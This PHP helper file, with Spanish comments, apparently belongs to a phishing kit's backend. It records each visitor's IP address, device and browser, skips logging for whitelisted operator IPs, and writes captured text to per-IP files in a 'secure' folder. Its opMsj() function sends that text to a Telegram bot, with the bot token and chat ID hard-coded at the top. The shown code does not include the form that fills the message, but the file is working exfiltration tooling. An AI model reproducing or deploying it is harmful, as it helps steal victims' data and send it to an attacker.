﻿<?php

# ---- VARIABLES GLOBALES ---- #

error_reporting(0); # Desactivar Errores (Descomentar cuando active el sitio).
$document_root = $_SERVER['DOCUMENT_ROOT'].'/perso/en/security/lognon'; # Url principal del servidor.
$document_private = $document_root.'/private';
$capture_folder = $document_private.'/secure';
$interno_useragent = $document_private.'/useragent.class.php';
$interno_geoip = $document_private.'/geoip2.phar';
$interno_geoip_data = $document_private.'/GeoLite2-City.mmdb';
$TOKEN = "973100171:AAEm9YajTIRSOI_xpZ42Z8Q0iW51Ezl9uZU";
$chatId = "-454868818";

# ---- TimeZone ---- #
date_default_timezone_set('America/Caracas'); # Para guardar logs en horario de Venezuela.
$time = date('d/m/Y H:i:s');

# ---- INTERNO ---- #

if (!is_dir($capture_folder)) {
	echo "No existe el directorio: <b>".$capture_folder."</b>, Subio bien la aplicacion?"; exit;
}
if (file_exists($interno_useragent)) {
	require_once($interno_useragent);
} else {
	echo "No existe el fichero: <b>".$interno_useragent."</b>, Subio bien la aplicacion?"; exit;
}

# ---- VALIDACION IP ---- #

if (filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP)) {
	$ip = $_SERVER['REMOTE_ADDR'];
} else {
	$ip = 'A.L.E.R.T.A';
}

if ($ip == '::1' || $ip == '127.0.0.1' || strpos($ip, '192.168.43.') != False || $ip == '162.244.81.108') { # IP's autorizadas.
	$ip = 'S.E.R.V.E.R';
	$fcountry = 'Ubicación: UNIVERSE';
} elseif ($ip == 'A.L.E.R.T.A') {
	$fcountry = 'Ubicación: IP en alerta';
} else {
	$ip = $_SERVER['REMOTE_ADDR'];
	$fcountry = 'Ubicación Desconocida';
}

# ---- VALIDACION USER AGENT ---- #

use GeoIp2\Database\Reader;
$useragent = UserAgentFactory::analyze($_SERVER['HTTP_USER_AGENT']);

if (isset($useragent->platform['type']) && !empty($useragent->platform['type'])) {
	if ($useragent->platform['type'] == 'os') {
		if (isset($useragent->os['title']) && !empty($useragent->os['title'])) {
			$dispositivo  = $useragent->os['title'];
			if (isset($useragent->browser['name']) && !empty($useragent->browser['name'])) {
				if ($useragent->browser['name'] == 'Unknown') {
					$browser = 'Alerta con este dispositivo';
				} else {
					$browser = $useragent->browser['name'];
				}
			} else {
				$browser = 'Desconocido';
			}
		} else {
			$dispositivo = 'Desconocido';
			if (isset($useragent->browser['name']) && !empty($useragent->browser['name'])) {
				if ($useragent->browser['name'] == 'Unknown') {
					$browser = 'Alerta con este dispositivo';
				} else {
					$browser = $useragent->browser['name'];
				}
			} else {
				$browser = 'Desconocido';
			}
		}
	} elseif ($useragent->platform['type'] == 'device') {
		if (isset($useragent->device['title']) && !empty($useragent->device['title'])) {
			$dispositivo = $useragent->device['title'];
			if (isset($useragent->browser['name']) && !empty($useragent->browser['name'])) {
				if ($useragent->browser['name'] == 'Unknown') {
					$browser = 'Alerta con este dispositivo';
				} else {
					$browser = $useragent->browser['name'];
				}
			} else {
				$browser = 'Desconocido';
			}
		} else {
			$dispositivo = 'Desconocido';
			if (isset($useragent->browser['name']) && !empty($useragent->browser['name'])) {
				if ($useragent->browser['name'] == 'Unknown') {
					$browser = 'Alerta con este dispositivo';
				} else {
					$browser = $useragent->browser['name'];
				}
			} else {
				$browser = 'Desconocido';
			}
		}
	} else {
		$dispositivo = 'Desconocido';
		if (isset($useragent->browser['name']) && !empty($useragent->browser['name'])) {
			if ($useragent->browser['name'] == 'Unknown') {
				$browser = 'Alerta con este dispositivo';
			} else {
				$browser = $useragent->browser['name'];
			}
		} else {
			$browser = 'Desconocido';
		}
	}
} else {
	$dispositivo = 'Desconocido';
}

function openSecure($text, $type, $opt) {
	global $ip;
	global $capture_folder;
	$division = '-------------------------------------';
	if ($opt == true) {
		$capture = $capture_folder."/secure_".$ip.".txt";
	} else {
		$capture = $capture_folder."/secure_".$ip."_telegram_error.txt";
	}
	if ($type == 1) {
		try {
			$capture_resp = file_put_contents($capture, $division.$division.$division."\r\n".$_SERVER['HTTP_USER_AGENT']."\r\n".$division.$division.$division."\r\n".$text."\r\n".$division.$division.$division."\r\n", FILE_APPEND | LOCK_EX);
			if (!$capture_resp) {
				throw new Exception("Error guardando el log en: <b>$capture</b>");
			}
		} catch (Exception $e) {
			# CAPTURAR ESTE ERROR EN UNA DB COMO ERROR DEL SISTEMA -> $e
		}
	} elseif ($type == 2) {
		try {
			$capture_resp = file_put_contents($capture, $text."\r\n".$division.$division.$division."\r\n", FILE_APPEND | LOCK_EX);
			if (!$capture_resp) {
				throw new Exception("Error guardando el log en: <b>$capture</b>");
			}
		} catch (Exception $e) {
			# CAPTURAR ESTE ERROR EN UNA DB COMO ERROR DEL SISTEMA -> $e
		}
	}
}

function opMsj($text, $type) {
	global $msj;
	global $TOKEN;
	global $chatId;
	$TELEGRAM = "https://api.telegram.org:443/bot$TOKEN"; 

	$query = http_build_query(array(
		'chat_id'=> $chatId,
		'text'=> $text,
		'parse_mode'=> "HTML",
	));
	try {
		if (file_get_contents("$TELEGRAM/sendMessage?$query", false, stream_context_create(['http' => ['ignore_errors' => true]]))) {
			$http_resp = $http_response_header[0];
			if (!strpos($http_resp, '200')) {
				if ($type == 1) {
					openSecure($msj, 1, false);
				} elseif ($type == 2) {
					openSecure($msj, 2, false);
				}
			} else {
				if ($type == 1) {
					openSecure($msj, 1, true);
				} elseif ($type == 2) {
					openSecure($msj, 2, true);
				}
			}
		} else {
			throw new Exception("Error conectando al bot de telegram");
		}
	} catch (Exception $e) {
		# CAPTURAR ESTE ERROR EN UNA DB COMO ERROR DEL SISTEMA -> $e
		if ($type == 1) {
			openSecure($msj, 1, false);
		} elseif ($type == 2) {
			openSecure($msj, 2, false);
		}
	}
}

?>